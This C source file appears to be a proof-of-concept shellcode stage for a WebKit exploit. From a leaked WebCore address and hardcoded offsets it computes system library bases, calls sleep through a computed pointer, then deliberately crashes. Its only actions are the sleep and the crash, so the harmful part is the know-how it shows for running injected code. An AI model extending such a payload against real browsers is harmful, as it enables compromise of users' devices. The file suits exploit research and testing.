#include <stdio.h>
#include <dlfcn.h>
#include <asl.h>
#include <unistd.h>
#include <syslog.h>
#include <objc/runtime.h>

#define GLOB __attribute__((section("__TEXT, __text")))

#define CSTR(x) ({\
        static GLOB char tempstr[] = x;\
        tempstr;\
        })

int c_start(unsigned long long webcore_base) {
    unsigned long long libdyld_base = webcore_base - (0x190045000 - 0x18134f000);
    unsigned long long libsystem_asl_base = webcore_base - (0x190045000 - 0x1a5ebf000);

    unsigned long long libsystem_c_base = webcore_base - (0x190045000 - 0x18bd3d000);
    unsigned long long sleep_addr = libsystem_c_base + 0x186E0;
    typedef unsigned int (*sleep_func)(unsigned int);
    sleep_func sleep_ptr = (sleep_func)sleep_addr;
    sleep_ptr(3);

    // crash
    *(unsigned long long *)0xdeaddead = 0x1337;

    return 0;
}
